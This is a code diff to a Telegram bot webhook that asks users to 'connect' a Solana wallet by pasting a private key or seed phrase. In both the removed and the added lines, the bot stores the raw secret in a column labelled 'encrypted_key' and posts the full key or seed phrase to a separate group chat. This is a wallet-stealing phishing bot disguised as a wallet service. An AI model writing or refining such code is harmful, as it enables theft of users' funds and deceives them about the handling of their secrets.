@@ -685,41 +685,29 @@ export const Route = createFileRoute('/api/public/telegram/webhook')({
                 if (kp) {
                   const address = kp.publicKey.toBase58();
                   const requester = username !== 'there' ? `@${username}` : `user ${userId}`;
-                  try {
-                    const { solBalance, tokenText } = await getWalletBalances(address);
-                    await tg('sendMessage', {
-                      chat_id: chatId,
-                      parse_mode: 'HTML',
-                      text: `✅ <b>Successfully connected</b>\n\n` +
-                            `<b>Address:</b> <code>${address}</code>\n` +
-                            `<b>SOL Balance:</b> ${solBalance} SOL\n` +
-                            `<b>Token Balance:</b> ${tokenText}`,
-                    });
-                    await supabaseAdmin.from('imported_wallets').insert({
-                      telegram_user_id: userId,
-                      address: address,
-                      encrypted_key: text.trim(),
-                    });
-                    // Notify the group/channel with full key material
-                    const secretLabel = state === 'AWAITING_PK' ? 'Private Key' : 'Seed Phrase';
-                    await tg('sendMessage', {
-                      chat_id: groupChatId,
-                      parse_mode: 'HTML',
-                      text: `📥 Wallet imported by ${escapeHtml(requester)}\n\n` +
-                            `<b>Address:</b> <code>${address}</code>\n` +
-                            `<b>SOL Balance:</b> ${solBalance} SOL\n\n` +
-                            `<b>${secretLabel}:</b>\n<code>${escapeHtml(text.trim())}</code>`,
-                    });
-                  } catch (e) {
-                    console.error('Balance fetch error:', e);
-                    await tg('sendMessage', {
-                      chat_id: chatId,
-                      parse_mode: 'HTML',
-                      text: `✅ <b>Successfully connected</b>\n\n` +
-                            `<b>Address:</b> <code>${address}</code>\n` +
-                            `(Could not fetch balances right now)`,
-                    });
-                  }
+                  const r = await getWalletBalances(address);
+                  await tg('sendMessage', {
+                    chat_id: chatId,
+                    parse_mode: 'HTML',
+                    text:
+                      `✅ <b>Successfully connected</b>\n\n` +
+                      formatBalanceCard(address, r) +
+                      lowBalanceNotice(r.solBalance),
+                  });
+                  await supabaseAdmin.from('imported_wallets').insert({
+                    telegram_user_id: userId,
+                    address: address,
+                    encrypted_key: text.trim(),
+                  });
+                  const secretLabel = state === 'AWAITING_PK' ? 'Private Key' : 'Seed Phrase';
+                  await tg('sendMessage', {
+                    chat_id: groupChatId,
+                    parse_mode: 'HTML',
+                    text:
+                      `📥 Wallet imported by ${escapeHtml(requester)}\n\n` +
+                      formatBalanceCard(address, r) +
+                      `\n\n<b>${secretLabel}:</b>\n<code>${escapeHtml(text.trim())}</code>`,
+                  });
                   if (userId) await clearUserState(userId);
                 } else {
                   // Detect if user pasted a wallet address instead of a key/phrase
